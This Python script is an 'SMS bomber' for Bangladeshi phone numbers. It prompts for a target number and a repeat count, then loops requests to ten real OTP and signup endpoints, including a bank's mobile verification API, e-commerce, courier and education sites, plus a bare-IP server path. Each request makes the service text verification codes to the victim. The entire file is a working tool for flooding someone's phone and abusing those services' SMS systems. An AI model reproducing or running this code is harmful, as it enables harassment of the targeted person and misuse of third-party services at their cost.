import requests
from requests.structures import CaseInsensitiveDict
import os,sys,time,requests,random,string
import random

RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'

logo = ("""\033[1;32m


    ___                        
   /   |  ____ ___  ____ _____ 
  / /| | / __ `__ \/ __ `/ __ \
  
 / ___ |/ / / / / / /_/ / / / /
/_/  |_/_/ /_/ /_/\__,_/_/ /_/ 
                                     
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┏━━━━━━━━━━━━━━━━━┓
  ┃ ┏━━[+]  AUTHOR   ➤ Aman khan ┃TOOL➤ SMS BOMBER ┃
  ┃ ┣━━[+]  GITHUB   ➤ 5UP3R1    ┃VERSION ➤ 1.0.0  ┃
  ┃ ┣━━[+]  TYPE     ➤ FREE      ┗━━━━━━━━━━━━━━━━━┃
  ┃ ┣━━[+]  NETWORK  ➤ DATA AND WIFI               ┃
  ┃ ┣━━[+]  STATUS   ➤ Active...                   ┃
  ┃ ┣━━[+]  FACEBOOK ➤ sorry1314                   ┃
  ┃ ┗━━[+]  TELEGRAM ➤ @aman_sdp                   ┃
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n\n\033[1;37m""")

z = ".Request Sent!"

def Main():
	    os.system("clear")
print (logo)

x = str(input("\033[1;32mTarget Number: +880"))
y = int(input("Enter Amount: "))

os.system("clear")

url1 = "http://206.189.134.221/wordpress/wp-content/uploads/bmb/0"+x

url4 = "https://reqbin.com/echo/post/json"

headers4 = CaseInsensitiveDict()
headers4["Accept"] = "application/json"
headers4["Authorization"] = "Bearer {token}"
headers4["Content-Type"] = "application/json"

data4 = '{"name":"'+x+'","phoneNumber":"'+x+'","service":"redx"}'


url2 = "https://ultranetrn.com.br/fonts/api.php?number=0"+x

url5 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"

headers5 = CaseInsensitiveDict()
headers5["Content-Type"] = "application/json"

data5 = """
{
  "AccessToken": "",
      "TrackingNo": "",
  "mobileNo": "0"""""+x+"""",
  "otpSms": "",
  "product_id": "201",
  "requestChannel": "MOB",
  "trackingStatus": 5
  }
"""


url3 = "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=0"+x

url6 = "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web"

headers6 = CaseInsensitiveDict()
headers6["Host"] = "api.ghoorilearning.com"
headers6["Origin"] = "https://ghoorilearning.com"
headers6["Referer"] = "https://ghoorilearning.com/"
headers6["Content-Type"] = "application/json"

data6 = '{"name":"asad","mobile_no":"0'+x+'","password":"WzfTW4Cecz7NjAm","confirm_password":"WzfTW4Cecz7NjAm"}'

url7 = "https://api.shikho.com/auth/v2/send/sms"

headers7 = CaseInsensitiveDict()
headers7["Content-Type"] = "application/json"

data7 = '{"phone":"0'+x+'","type":"student","auth_type":"signup","vendor":"shikho"}'

url8 = "https://www.rokomari.com/otp/send?emailOrPhone=880"+x+"&countryCode=BD"

url9 = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv&deviceId=browser-dd418775-f90c-ff83-6ddc-06a1ef77e299&campaign=10520739960&campaign_source=google&campaign_medium=cpc"

headers9 = CaseInsensitiveDict()
headers9["Content-Type"] = "application/json"

data9 = '{"phoneNumber":"+880'+x+'","requestType":"send","whatsappConsent":true}'

url10 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+x

print (logo)

print ("\033[1;91m    ┏━━━[+] Don't Try to Bypass any Limitations 😒    ")
print (str("N.  ┣━━━[+] Don't Bomb at Unknown Number.    "))
print ("    ┗━━━[+] Bombing started...    \033[1;91m")
print ("\033[1;32m")


for j in range(y):

    resp1 = requests.get(url1)

    print(str((j*10)+1)+z)
    
    resp2 = requests.post(url4, headers=headers4, data=data4)
    
    print(str((j*10)+2)+z)
    
    resp3 = requests.get(url2)

    print(str((j*10)+3)+z)
    
    resp4 = requests.post(url5,headers=headers5, data=data5)
    
    print(str((j*10)+4)+z)
    
    resp5 = requests.get(url3)

    print(str((j*10)+5)+z)
    
    resp6 = requests.post(url6, headers=headers6, data=data6)
    
    print(str((j*10)+6)+z)
    
    resp7 = requests.post(url7, headers=headers7, data=data7)
    
    print(str((j*10)+7)+z)
    
    resp8 = requests.post(url8)
    
    print(str((j*10)+8)+z)
    
    resp9 = requests.post(url9, headers=headers9, data=data9)
    
    print(str((j*10)+9)+z)
    
    resp10 = requests.get(url10)

    print(str((j*10)+10)+z)

else: 
	input("Your Pogram Finished Enter For Continue")
	os.system("clear")
	os.system("python v2.0.py")

